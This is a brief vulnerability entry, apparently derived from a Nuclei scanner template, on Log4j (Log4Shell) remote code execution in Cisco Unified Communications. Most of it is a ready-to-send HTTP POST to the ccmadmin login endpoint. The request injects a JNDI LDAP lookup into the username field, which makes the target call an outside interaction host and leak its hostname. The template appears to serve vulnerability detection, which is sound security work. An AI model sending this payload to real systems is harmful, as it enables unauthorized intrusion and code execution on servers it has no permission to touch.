# Vulnerability: Cisco Unified Communications - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`cisco-unified-communications-log4j-rce.yaml`)

## Description
Cisco Unified Communications is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ccmadmin/j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{BaseURL}}/ccmadmin/showHome.do

appNav=ccmadmin&j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&j_password=admin
```

